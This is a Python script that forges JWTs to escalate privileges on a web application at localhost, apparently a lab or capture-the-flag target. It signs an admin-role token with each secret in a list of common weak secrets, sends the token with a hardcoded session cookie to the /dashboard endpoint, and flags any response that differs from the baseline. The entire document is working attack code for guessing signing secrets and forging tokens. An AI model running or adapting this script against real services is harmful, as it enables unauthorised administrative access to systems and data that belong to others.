import base64, hmac, hashlib, json, urllib.request

BASE = 'http://localhost:80'
SESSION = 'eyJ1c2VyX2lkIjoxMDAzMn0.aXfXIQ.isQHfguJrJRKzckVEYBBdqn_pME'

secrets = [
    'secret','secretkey','changeme','test','testing','dev','development','password','123456',
    'tradingplatform','jwtsecret','mysecret','mysecretkey','supersecret','admin','flasksecret',
    'flaskapp','key','default','apisecret','token','jwt','trade','platform','jwt_key','jwt-secret'
]

header = {"alg":"HS256","typ":"JWT"}
payload = {"username":"test","user_id":10032,"user_type":"admin"}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def sign(secret: str, msg: bytes) -> str:
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return b64url(sig)

# Fetch baseline content with current normal token (customer)
baseline_req = urllib.request.Request(BASE+'/dashboard', headers={'Cookie': 'session='+SESSION})
with urllib.request.urlopen(baseline_req) as resp:
    baseline = resp.read()

found = []
for sec in secrets:
    header_b64 = b64url(json.dumps(header, separators=(',',':')).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature_b64 = sign(sec, signing_input)
    token = f"{header_b64}.{payload_b64}.{signature_b64}"

    req = urllib.request.Request(BASE+'/dashboard', headers={'Cookie': f'auth_token={token}; session={SESSION}'})
    try:
        with urllib.request.urlopen(req) as resp:
            body = resp.read()
            if body != baseline:
                found.append((sec, len(body), body.decode(errors='ignore')[:300]))
    except Exception as e:
        continue

print('RESULTS', found[:3])
print('COUNT', len(found))

